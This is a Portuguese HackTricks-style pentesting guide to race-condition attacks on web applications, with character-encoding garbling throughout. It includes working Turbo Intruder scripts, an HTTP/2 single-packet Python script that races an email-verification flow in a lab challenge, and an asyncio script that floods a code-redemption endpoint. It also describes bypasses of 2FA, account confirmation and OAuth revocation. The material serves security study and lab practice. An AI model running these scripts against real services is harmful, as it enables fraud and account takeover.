# Condi√ß√£o de Corrida

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas** comunit√°rias **mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

{% hint style="warning" %}
Para obter uma compreens√£o profunda desta t√©cnica, consulte o relat√≥rio original em [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Aprimorando Ataques de Condi√ß√£o de Corrida

O principal obst√°culo para aproveitar as condi√ß√µes de corrida √© garantir que m√∫ltiplas requisi√ß√µes sejam tratadas ao mesmo tempo, com **muita pouca diferen√ßa em seus tempos de processamento‚Äîidealmente, menos de 1ms**.

Aqui voc√™ pode encontrar algumas t√©cnicas para Sincronizar Requisi√ß√µes:

#### Ataque de Pacote √önico HTTP/2 vs. Sincroniza√ß√£o do √öltimo Byte HTTP/1.1

* **HTTP/2**: Suporta o envio de duas requisi√ß√µes sobre uma √∫nica conex√£o TCP, reduzindo o impacto da varia√ß√£o de rede. No entanto, devido a varia√ß√µes do lado do servidor, duas requisi√ß√µes podem n√£o ser suficientes para um exploit consistente de condi√ß√£o de corrida.
* **Sincroniza√ß√£o do '√öltimo Byte' HTTP/1.1**: Permite o pr√©-envio da maior parte de 20-30 requisi√ß√µes, retendo um pequeno fragmento, que √© ent√£o enviado junto, alcan√ßando a chegada simult√¢nea ao servidor.

**Prepara√ß√£o para Sincroniza√ß√£o do √öltimo Byte** envolve:

1. Enviar cabe√ßalhos e dados do corpo menos o byte final sem encerrar o fluxo.
2. Pausar por 100ms ap√≥s o envio inicial.
3. Desativar TCP\_NODELAY para utilizar o algoritmo de Nagle para agrupar os quadros finais.
4. Pingar para aquecer a conex√£o.

O envio subsequente dos quadros retidos deve resultar em sua chegada em um √∫nico pacote, verific√°vel via Wireshark. Este m√©todo n√£o se aplica a arquivos est√°ticos, que n√£o est√£o tipicamente envolvidos em ataques de RC.

### Adaptando-se √† Arquitetura do Servidor

Compreender a arquitetura do alvo √© crucial. Servidores front-end podem direcionar requisi√ß√µes de maneira diferente, afetando o tempo. O aquecimento proativo da conex√£o do lado do servidor, atrav√©s de requisi√ß√µes irrelevantes, pode normalizar o tempo das requisi√ß√µes.

#### Lidando com Bloqueio Baseado em Sess√£o

Frameworks como o manipulador de sess√£o do PHP serializam requisi√ß√µes por sess√£o, potencialmente obscurecendo vulnerabilidades. Utilizar diferentes tokens de sess√£o para cada requisi√ß√£o pode contornar esse problema.

#### Superando Limites de Taxa ou Recursos

Se o aquecimento da conex√£o for ineficaz, acionar intencionalmente os limites de taxa ou recursos dos servidores web atrav√©s de um fluxo de requisi√ß√µes fict√≠cias pode facilitar o ataque de pacote √∫nico, induzindo um atraso do lado do servidor prop√≠cio para condi√ß√µes de corrida.

## Exemplos de Ataque

* **Tubo Intruder - ataque de pacote √∫nico HTTP2 (1 endpoint)**: Voc√™ pode enviar a requisi√ß√£o para **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), voc√™ pode alterar na requisi√ß√£o o valor que deseja for√ßar para **`%s`** como em `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` e ent√£o selecionar o **`examples/race-single-packer-attack.py`** no menu suspenso:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Se voc√™ for **enviar valores diferentes**, voc√™ pode modificar o c√≥digo com este que usa uma lista de palavras da √°rea de transfer√™ncia:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Se a web n√£o suportar HTTP2 (apenas HTTP1.1), use `Engine.THREADED` ou `Engine.BURP` em vez de `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - ataque de pacote √∫nico HTTP2 (V√°rios endpoints)**: Caso voc√™ precise enviar uma solicita√ß√£o para 1 endpoint e depois v√°rias para outros endpoints para acionar o RCE, voc√™ pode alterar o script `race-single-packet-attack.py` com algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Tamb√©m est√° dispon√≠vel no **Repeater** atrav√©s da nova op√ß√£o '**Enviar grupo em paralelo**' no Burp Suite.
* Para **limit-overrun**, voc√™ pode apenas adicionar a **mesma solicita√ß√£o 50 vezes** no grupo.
* Para **connection warming**, voc√™ pode **adicionar** no **in√≠cio** do **grupo** algumas **solicita√ß√µes** a uma parte n√£o est√°tica do servidor web.
* Para **delaying** o processo **entre** o processamento **de uma solicita√ß√£o e outra** em 2 etapas de subestado, voc√™ pode **adicionar solicita√ß√µes extras entre** ambas as solicita√ß√µes.
* Para um **multi-endpoint** RC, voc√™ pode come√ßar enviando a **solicita√ß√£o** que **vai para o estado oculto** e ent√£o **50 solicita√ß√µes** logo ap√≥s que **exploram o estado oculto**.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **Automated python script**: O objetivo deste script √© mudar o email de um usu√°rio enquanto verifica continuamente at√© que o token de verifica√ß√£o do novo email chegue ao √∫ltimo email (isso ocorre porque no c√≥digo estava sendo visto um RC onde era poss√≠vel modificar um email, mas ter a verifica√ß√£o enviada para o antigo porque a vari√°vel indicando o email j√° estava populada com o primeiro).\
Quando a palavra "objetivo" √© encontrada nos emails recebidos, sabemos que recebemos o token de verifica√ß√£o do email alterado e encerramos o ataque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Melhorando o Ataque de Pacote √önico

Na pesquisa original, foi explicado que este ataque tem um limite de 1.500 bytes. No entanto, em [**este post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), foi explicado como √© poss√≠vel estender a limita√ß√£o de 1.500 bytes do ataque de pacote √∫nico para a **limita√ß√£o de janela de 65.535 B do TCP usando fragmenta√ß√£o na camada IP** (dividindo um √∫nico pacote em v√°rios pacotes IP) e enviando-os em ordem diferente, o que permitiu evitar a reassemblagem do pacote at√© que todos os fragmentos chegassem ao servidor. Essa t√©cnica permitiu que o pesquisador enviasse 10.000 solicita√ß√µes em cerca de 166ms.&#x20;

Observe que, embora essa melhoria torne o ataque mais confi√°vel em RC que requer centenas/milhares de pacotes para chegar ao mesmo tempo, pode tamb√©m ter algumas limita√ß√µes de software. Alguns servidores HTTP populares como Apache, Nginx e Go t√™m uma configura√ß√£o estrita de `SETTINGS_MAX_CONCURRENT_STREAMS` para 100, 128 e 250. No entanto, outros como NodeJS e nghttp2 t√™m isso ilimitado.\
Isso basicamente significa que o Apache considerar√° apenas 100 conex√µes HTTP de uma √∫nica conex√£o TCP (limitando este ataque RC).

Voc√™ pode encontrar alguns exemplos usando essa t√©cnica no reposit√≥rio [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## BF Bruto

Antes da pesquisa anterior, esses eram alguns payloads usados que apenas tentavam enviar os pacotes o mais r√°pido poss√≠vel para causar um RC.

* **Repetidor:** Confira os exemplos da se√ß√£o anterior.
* **Intruso**: Envie a **solicita√ß√£o** para **Intruso**, defina o **n√∫mero de threads** para **30** dentro do **menu de Op√ß√µes** e selecione como payload **Payloads Nulos** e gere **30.**
* **Turbo Intruso**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodologia RC**

### Limite-excesso / TOCTOU

Este √© o tipo mais b√°sico de condi√ß√£o de corrida onde **vulnerabilidades** que **aparecem** em lugares que **limitam o n√∫mero de vezes que voc√™ pode realizar uma a√ß√£o**. Como usar o mesmo c√≥digo de desconto em uma loja online v√°rias vezes. Um exemplo muito f√°cil pode ser encontrado em [**este relat√≥rio**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ou em [**este bug**](https://hackerone.com/reports/759247)**.**

Existem muitas varia√ß√µes desse tipo de ataque, incluindo:

* Resgatar um cart√£o-presente v√°rias vezes
* Avaliar um produto v√°rias vezes
* Sacar ou transferir dinheiro al√©m do saldo da sua conta
* Reutilizar uma √∫nica solu√ß√£o de CAPTCHA
* Contornar um limite de taxa anti-for√ßa bruta

### **Subestados ocultos**

Explorar condi√ß√µes de corrida complexas geralmente envolve aproveitar breves oportunidades para interagir com subestados de m√°quina ocultos ou **n√£o intencionais**. Aqui est√° como abordar isso:

1. **Identificar Subestados Ocultos Potenciais**
* Comece identificando endpoints que modificam ou interagem com dados cr√≠ticos, como perfis de usu√°rio ou processos de redefini√ß√£o de senha. Foque em:
* **Armazenamento**: Prefira endpoints que manipulam dados persistentes do lado do servidor em vez daqueles que lidam com dados do lado do cliente.
* **A√ß√£o**: Procure opera√ß√µes que alteram dados existentes, que s√£o mais propensas a criar condi√ß√µes explor√°veis em compara√ß√£o com aquelas que adicionam novos dados.
* **Chaveamento**: Ataques bem-sucedidos geralmente envolvem opera√ß√µes chaveadas no mesmo identificador, por exemplo, nome de usu√°rio ou token de redefini√ß√£o.
2. **Realizar Probing Inicial**
* Teste os endpoints identificados com ataques de condi√ß√£o de corrida, observando quaisquer desvios dos resultados esperados. Respostas inesperadas ou mudan√ßas no comportamento da aplica√ß√£o podem sinalizar uma vulnerabilidade.
3. **Demonstrar a Vulnerabilidade**
* Reduza o ataque ao n√∫mero m√≠nimo de solicita√ß√µes necess√°rias para explorar a vulnerabilidade, muitas vezes apenas duas. Esta etapa pode exigir v√°rias tentativas ou automa√ß√£o devido ao tempo preciso envolvido.

### Ataques Sens√≠veis ao Tempo

A precis√£o no tempo das solicita√ß√µes pode revelar vulnerabilidades, especialmente quando m√©todos previs√≠veis como timestamps s√£o usados para tokens de seguran√ßa. Por exemplo, gerar tokens de redefini√ß√£o de senha com base em timestamps pode permitir tokens id√™nticos para solicita√ß√µes simult√¢neas.

**Para Explorar:**

* Use temporiza√ß√£o precisa, como um ataque de pacote √∫nico, para fazer solicita√ß√µes de redefini√ß√£o de senha simult√¢neas. Tokens id√™nticos indicam uma vulnerabilidade.

**Exemplo:**

* Solicite dois tokens de redefini√ß√£o de senha ao mesmo tempo e compare-os. Tokens correspondentes sugerem uma falha na gera√ß√£o de tokens.

**Verifique isso** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **para tentar isso.**

## Estudos de caso de subestados ocultos

### Pagar e adicionar um Item

Verifique este [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver como **pagar** em uma loja e **adicionar um item extra** que voc√™ **n√£o precisar√° pagar**.

### Confirmar outros e-mails

A ideia √© **verificar um endere√ßo de e-mail e mud√°-lo para um diferente ao mesmo tempo** para descobrir se a plataforma verifica o novo que foi alterado.

### Mudar e-mail para 2 endere√ßos de e-mail baseados em Cookie

De acordo com [**esta pesquisa**](https://portswigger.net/research/smashing-the-state-machine), o Gitlab era vulner√°vel a uma tomada dessa forma porque poderia **enviar** o **token de verifica√ß√£o de e-mail de um e-mail para o outro e-mail**.

**Verifique isso** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **para tentar isso.**

### Estados ocultos do banco de dados / Bypass de Confirma√ß√£o

Se **2 grava√ß√µes diferentes** forem usadas para **adicionar** **informa√ß√µes** dentro de um **banco de dados**, h√° uma pequena por√ß√£o de tempo onde **apenas os primeiros dados foram gravados** dentro do banco de dados. Por exemplo, ao criar um usu√°rio, o **nome de usu√°rio** e a **senha** podem ser **gravados** e **ent√£o o token** para confirmar a conta rec√©m-criada √© gravado. Isso significa que por um pequeno tempo o **token para confirmar uma conta √© nulo**.

Portanto, **registrar uma conta e enviar v√°rias solicita√ß√µes com um token vazio** (`token=` ou `token[]=` ou qualquer outra varia√ß√£o) para confirmar a conta imediatamente poderia permitir **confirmar uma conta** onde voc√™ n√£o controla o e-mail.

**Verifique isso** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **para tentar isso.**

### Bypass 2FA

O seguinte pseudo-c√≥digo √© vulner√°vel a condi√ß√£o de corrida porque em um tempo muito pequeno a **2FA n√£o √© aplicada** enquanto a sess√£o √© criada:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 persist√™ncia eterna

Existem v√°rios [**provedores de OAUth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Esses servi√ßos permitem que voc√™ crie um aplicativo e autentique usu√°rios que o provedor registrou. Para fazer isso, o **cliente** precisar√° **permitir que seu aplicativo** acesse alguns de seus dados dentro do **provedor de OAUth**.\
At√© aqui, √© apenas um login comum com google/linkedin/github... onde voc√™ √© solicitado com uma p√°gina dizendo: "_Aplicativo \<InsertCoolName> deseja acessar suas informa√ß√µes, voc√™ quer permitir?_"

#### Condi√ß√£o de Corrida em `authorization_code`

O **problema** aparece quando voc√™ **aceita** e automaticamente envia um **`authorization_code`** para o aplicativo malicioso. Ent√£o, este **aplicativo abusa de uma Condi√ß√£o de Corrida no provedor de servi√ßo OAUth para gerar mais de um AT/RT** (_Authentication Token/Refresh Token_) a partir do **`authorization_code`** para sua conta. Basicamente, ele abusar√° do fato de que voc√™ aceitou o aplicativo para acessar seus dados para **criar v√°rias contas**. Ent√£o, se voc√™ **parar de permitir que o aplicativo acesse seus dados, um par de AT/RT ser√° exclu√≠do, mas os outros ainda ser√£o v√°lidos**.

#### Condi√ß√£o de Corrida em `Refresh Token`

Uma vez que voc√™ tenha **obtido um RT v√°lido**, voc√™ pode tentar **abusar dele para gerar v√°rios AT/RT** e **mesmo que o usu√°rio cancele as permiss√µes** para o aplicativo malicioso acessar seus dados, **v√°rios RTs ainda ser√£o v√°lidos.**

## **RC em WebSockets**

Em [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) voc√™ pode encontrar um PoC em Java para enviar mensagens websocket em **paralelo** para abusar de **Condi√ß√µes de Corrida tamb√©m em Web Sockets**.

## Refer√™ncias

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) para construir e **automatizar fluxos de trabalho** facilmente com as ferramentas **mais avan√ßadas** da comunidade.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
